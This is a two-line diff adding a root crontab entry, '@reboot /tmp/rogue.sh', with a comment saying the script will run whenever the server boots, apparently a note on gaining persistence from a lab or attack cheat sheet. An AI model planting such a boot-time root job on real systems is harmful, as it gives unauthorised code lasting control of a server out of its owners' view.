@@ -1,0 +1,2 @@
+crontab -e
+@reboot /tmp/rogue.sh ## add these line into root crontab. script will be run when server bootup
